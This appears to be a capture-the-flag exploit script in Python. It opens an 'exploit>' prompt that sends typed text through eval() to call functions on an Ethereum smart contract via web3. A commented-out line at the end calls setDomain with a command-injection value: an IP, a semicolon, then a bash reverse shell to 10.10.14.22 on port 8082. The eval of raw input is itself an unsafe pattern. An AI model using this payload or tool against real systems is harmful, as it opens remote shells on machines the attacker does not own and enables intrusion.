from web3 import Web3, HTTPProvider
import json
import sys
import argparse
import cmd
import types

ap = argparse.ArgumentParser(description='Minimal command line utility to interact with an etherum blockchain')

ap.add_argument("-a", "--address", required=True, help="contract address")
ap.add_argument("-j", "--json", required=True, help="json contact file to read")
ap.add_argument("-u", "--url", required=True, help="HTTP url to connect to")
args = vars(ap.parse_args())

# load config
def establishHTTP(url):
	try:
		w3 = Web3(HTTPProvider(args['url']))
		return w3
	except:
		print("failed to establish connection")
		sys.exit(1)

def configure():
	w3.eth.defaultAccount = w3.eth.accounts[0]
	print(w3.eth.defaultAccount)
	contract = w3.eth.contract(abi=abi, address=contract_address)
	return contract

class exploit(cmd.Cmd):
	prompt = "exploit>"

	def default(self,line):
		line = "contract.functions."+line #getDomain().call()
		print(eval(line))

try:
	contract_address = args["address"]
except:
	print("Failed to read address")
	sys.exit(1)

try:
	contract_data = json.loads(open(args["json"],'r').read())
except:
	print("Failed to open json file")

try:
	abi = contract_data["abi"]
except:
	print("Check if the json file is correct file")
	print("debug: failed to extract abi")


w3 = establishHTTP(args["url"])
contract = configure()

print("in the cmd below, write the function to execute")
print("*** followed by .call() if you are retrieving value")
print("*** followed by .transact() if you are submitting value")
print("example getDomain().call() will call contract.functions.getDomain().call()")
exploit().cmdloop()
#print get domain


#print(contract.functions.getDomain().call())

#print(contract.functions.setDomain('10.10.14.22; bash -c "bash -i >& /dev/tcp/10.10.14.22/8082 0>&1"').transact())
